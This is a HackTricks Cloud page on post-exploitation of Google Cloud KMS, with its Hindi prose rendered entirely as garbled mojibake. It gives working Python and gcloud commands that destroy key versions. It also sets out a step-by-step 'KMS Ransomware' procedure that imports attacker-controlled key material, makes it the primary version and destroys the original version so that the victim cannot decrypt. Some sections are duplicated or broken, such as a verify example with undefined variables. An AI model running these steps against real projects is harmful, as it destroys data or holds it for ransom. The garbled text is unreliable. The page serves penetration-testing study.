# GCP - KMS Post Exploitation

{% hint style="success" %}
AWS Hacking ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡•ã ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§¶‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§ì‡§Ç**](https://github.com/sponsors/carlospolop) ‡§ï‡•Ä ‡§ú‡§æ‡§Å‡§ö ‡§ï‡§∞‡•á‡§Ç!
* **üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **Twitter** üê¶ ‡§™‡§∞ **‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç‡•§

</details>
{% endhint %}

## KMS

KMS ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§¨‡•Å‡§®‡§ø‡§Ø‡§æ‡§¶‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç:

{% content-ref url="../gcp-services/gcp-kms-enum.md" %}
[gcp-kms-enum.md](../gcp-services/gcp-kms-enum.md)
{% endcontent-ref %}

### `cloudkms.cryptoKeyVersions.destroy`

‡§á‡§∏ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§µ‡§æ‡§≤‡§æ ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ KMS ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§ï‡•ã ‡§®‡§∑‡•ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§ê‡§∏‡§æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡§π‡§≤‡•á ‡§Ü‡§™‡§ï‡•ã ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§á‡§∏‡•á ‡§®‡§∑‡•ç‡§ü ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ:
```python
# pip install google-cloud-kms

from google.cloud import kms

def disable_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Disables a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to disable the key version.
client.update_crypto_key_version(request={'crypto_key_version': {'name': key_version_name, 'state': kms.CryptoKeyVersion.State.DISABLED}})

def destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Destroys a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to destroy the key version.
client.destroy_crypto_key_version(request={'name': key_version_name})

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'  # Version number to disable and destroy

# Disable the key version
disable_key_version(project_id, location_id, key_ring_id, key_id, key_version)

# Destroy the key version
destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version)
```
### KMS Ransomware

AWS ‡§Æ‡•á‡§Ç, KMS resource policy ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§ï‡•á ‡§î‡§∞ ‡§ï‡•á‡§µ‡§≤ ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•á ‡§ñ‡§æ‡§§‡•á ‡§ï‡•ã ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§ï‡§∞ ‡§è‡§ï KMS ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡•ã ‡§™‡•Ç‡§∞‡•Ä ‡§§‡§∞‡§π ‡§∏‡•á **‡§ö‡•ã‡§∞‡•Ä ‡§ï‡§∞‡§®‡§æ** ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§ ‡§ö‡•Ç‡§Ç‡§ï‡§ø ‡§Ø‡•á resource policies GCP ‡§Æ‡•á‡§Ç ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡§Ç, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§µ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§

‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§è‡§ï ‡§µ‡•à‡§∂‡•ç‡§µ‡§ø‡§ï KMS Ransomware ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§è‡§ï ‡§î‡§∞ ‡§§‡§∞‡•Ä‡§ï‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ö‡§∞‡§£ ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç‡§ó‡•á:

* ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§Ü‡§Ø‡§æ‡§§‡§ø‡§§ key material ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§®‡§à **‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡§æ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£** ‡§¨‡§®‡§æ‡§è‡§Ç

{% code overflow="wrap" %}
```bash
gcloud kms import-jobs create [IMPORT_JOB] --location [LOCATION] --keyring [KEY_RING] --import-method [IMPORT_METHOD] --protection-level [PROTECTION_LEVEL] --target-key [KEY]
```
{% endcode %}

* ‡§á‡§∏‡•á **‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§∏‡•á‡§ü ‡§ï‡§∞‡•á‡§Ç (‡§≠‡§µ‡§ø‡§∑‡•ç‡§Ø ‡§ï‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡•ã ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ)
* **‡§™‡•Å‡§∞‡§æ‡§®‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§™‡•Å‡§®‡§É ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡•á‡§Ç** ‡§ú‡•ã ‡§™‡§ø‡§õ‡§≤‡•á ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ, ‡§®‡§è ‡§ï‡•á ‡§∏‡§æ‡§•‡•§
* **KMS ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡•ã ‡§π‡§ü‡§æ‡§è‡§Ç**
* ‡§Ö‡§¨ ‡§ï‡•á‡§µ‡§≤ ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞, ‡§ú‡§ø‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ ‡§Æ‡•Ç‡§≤ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§π‡•à, ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§ó‡§æ

#### ‡§Ø‡§π‡§æ‡§Ç ‡§®‡§è ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§ï‡•ã ‡§Ü‡§Ø‡§æ‡§§ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§™‡•Å‡§∞‡§æ‡§®‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§Ö‡§ï‡•ç‡§∑‡§Æ/‡§π‡§ü‡§æ‡§®‡•á ‡§ï‡•á ‡§ö‡§∞‡§£ ‡§¶‡§ø‡§è ‡§ó‡§è ‡§π‡•à‡§Ç:
```bash
# Encrypt something with the original key
echo "This is a sample text to encrypt" > /tmp/my-plaintext-file.txt
gcloud kms encrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--plaintext-file my-plaintext-file.txt \
--ciphertext-file my-encrypted-file.enc

# Decrypt it
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -


# Create an Import Job
gcloud kms import-jobs create my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--import-method "rsa-oaep-3072-sha1-aes-256" \
--protection-level "software"

# Generate key material
openssl rand -out my-key-material.bin 32

# Import the Key Material (it's encrypted with an asymetrict key of the import job previous to be sent)
gcloud kms keys versions import \
--import-job my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--algorithm "google-symmetric-encryption" \
--target-key-file my-key-material.bin

# Get versions
gcloud kms keys versions list \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key

# Make new version primary
gcloud kms keys update \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--primary-version 2

# Try to decrypt again (error)
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -

# Disable initial version
gcloud kms keys versions disable \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key 1

# Destroy the old version
gcloud kms keys versions destroy \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--version 1

```
### `cloudkms.cryptoKeyVersions.useToEncrypt` | `cloudkms.cryptoKeyVersions.useToEncryptViaDelegation`

#### Privileges Required

‡§á‡§∏ ‡§π‡§Æ‡§≤‡•á ‡§ï‡•ã ‡§∏‡§´‡§≤‡§§‡§æ‡§™‡•Ç‡§∞‡•ç‡§µ‡§ï ‡§Ö‡§Ç‡§ú‡§æ‡§Æ ‡§¶‡•á‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ IAM ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ‡§ì‡§Ç ‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§è‡§ï ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§ó‡•Ä:

- `roles/cloudkms.cryptoKeyEncrypter`
- `roles/cloudkms.cryptoKeyEncrypterDecrypter`
- `roles/owner`
- `roles/editor`

#### Attack Scenario

1. ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã `cloudkms.cryptoKeyVersions.useToEncrypt` ‡§Ø‡§æ `cloudkms.cryptoKeyVersions.useToEncryptViaDelegation` ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§∏‡•á‡§µ‡§æ ‡§ñ‡§æ‡§§‡§æ ‡§Ø‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ñ‡§æ‡§§‡§æ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§
2. ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§è‡§ï plaintext ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡•ã ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è KMS ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§
3. ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§¨‡§æ‡§¶ ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§Ø‡§æ ‡§Ö‡§®‡•ç‡§Ø ‡§™‡•ç‡§∞‡§£‡§æ‡§≤‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

#### Impact

‡§á‡§∏ ‡§π‡§Æ‡§≤‡•á ‡§ï‡§æ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•Ä ‡§ó‡•ã‡§™‡§®‡•Ä‡§Ø‡§§‡§æ ‡§¨‡§®‡•Ä ‡§∞‡§π‡§§‡•Ä ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§π ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡§æ ‡§ï‡§ø ‡§°‡•á‡§ü‡§æ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•á‡§µ‡§≤ ‡§Ö‡§ß‡§ø‡§ï‡•É‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§π‡•Ä ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§
```python
from google.cloud import kms
import base64

def encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext):
"""
Encrypts data using a symmetric key from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key name.
key_name = client.crypto_key_path(project_id, location_id, key_ring_id, key_id)

# Convert the plaintext to bytes.
plaintext_bytes = plaintext.encode('utf-8')

# Call the API.
encrypt_response = client.encrypt(request={'name': key_name, 'plaintext': plaintext_bytes})
ciphertext = encrypt_response.ciphertext

# Optional: Encode the ciphertext to base64 for easier handling.
return base64.b64encode(ciphertext)

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
plaintext = 'your-data-to-encrypt'

ciphertext = encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext)
print('Ciphertext:', ciphertext)
```
### `cloudkms.cryptoKeyVersions.useToSign`

#### Description

‡§Ø‡§π ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Ü‡§™‡§ï‡•ã ‡§è‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§°‡•á‡§ü‡§æ ‡§™‡§∞ ‡§π‡§∏‡•ç‡§§‡§æ‡§ï‡•ç‡§∑‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§π‡§∏‡•ç‡§§‡§æ‡§ï‡•ç‡§∑‡§∞ ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•à, ‡§ú‡•ã ‡§°‡•á‡§ü‡§æ ‡§ï‡•Ä ‡§Ö‡§ñ‡§Ç‡§°‡§§‡§æ ‡§î‡§∞ ‡§™‡•ç‡§∞‡§æ‡§Æ‡§æ‡§£‡§ø‡§ï‡§§‡§æ ‡§ï‡•Ä ‡§™‡•Å‡§∑‡•ç‡§ü‡§ø ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§Æ‡§¶‡§¶ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

#### Abusing the permission

‡§á‡§∏ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ gcloud ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

```bash
gcloud kms keys versions sign --key <KEY_NAME> --keyring <KEYRING_NAME> --location <LOCATION> --digest-algorithm <ALGORITHM> --digest <DIGEST>
```

#### Impact

‡§á‡§∏ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á, ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§°‡•á‡§ü‡§æ ‡§™‡§∞ ‡§π‡§∏‡•ç‡§§‡§æ‡§ï‡•ç‡§∑‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§Ø‡§π ‡§µ‡•à‡§ß ‡§™‡•ç‡§∞‡§§‡•Ä‡§§ ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§°‡•á‡§ü‡§æ ‡§ï‡•Ä ‡§Ö‡§ñ‡§Ç‡§°‡§§‡§æ ‡§î‡§∞ ‡§™‡•ç‡§∞‡§æ‡§Æ‡§æ‡§£‡§ø‡§ï‡§§‡§æ ‡§ï‡•ã ‡§ñ‡§§‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§≤ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§
```python
import hashlib
from google.cloud import kms

def sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message):
"""
Sign a message using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Call the API to sign the digest.
sign_response = client.asymmetric_sign(name=key_version_name, digest=digest)
return sign_response.signature

# Example usage for signing
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'
message = 'your-message'

signature = sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message)
print('Signature:', signature)
```
### `cloudkms.cryptoKeyVersions.useToVerify`

`cloudkms.cryptoKeyVersions.useToVerify` ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã cryptographic key ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã verify ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π post-exploitation ‡§ö‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§ñ‡§æ‡§∏‡§ï‡§∞ ‡§ú‡§¨ sensitive ‡§°‡•á‡§ü‡§æ ‡§ï‡•Ä integrity ‡§ï‡•ã ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§

### `cloudkms.cryptoKeyVersions.useToSign`

`cloudkms.cryptoKeyVersions.useToSign` ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã cryptographic key ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã sign ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã ‡§°‡•á‡§ü‡§æ ‡§ï‡•Ä authenticity ‡§ï‡•ã ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§

### `cloudkms.cryptoKeyVersions.viewPublicKey`

`cloudkms.cryptoKeyVersions.viewPublicKey` ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã public key ‡§ï‡•ã ‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã cryptographic operations ‡§ï‡•ã ‡§∏‡§Æ‡§ù‡§®‡•á ‡§î‡§∞ ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§π‡§Æ‡§≤‡•ã‡§Ç ‡§ï‡•ã ‡§Ö‡§Ç‡§ú‡§æ‡§Æ ‡§¶‡•á‡§®‡•á ‡§Æ‡•á‡§Ç ‡§Æ‡§¶‡§¶ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

### `cloudkms.cryptoKeyVersions.view`

`cloudkms.cryptoKeyVersions.view` ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã cryptographic key version ‡§ï‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã key management operations ‡§ï‡•ã ‡§∏‡§Æ‡§ù‡§®‡•á ‡§Æ‡•á‡§Ç ‡§Æ‡§¶‡§¶ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§
```python
from google.cloud import kms
import hashlib

def verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature):
"""
Verify a signature using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Build the verify request and call the API.
verify_response = client.asymmetric_verify(name=key_version_name, digest=digest, signature=signature)
return verify_response.success

# Example usage for verification
verified = verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature)
print('Verified:', verified)
```
{% hint style="success" %}
AWS Hacking ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
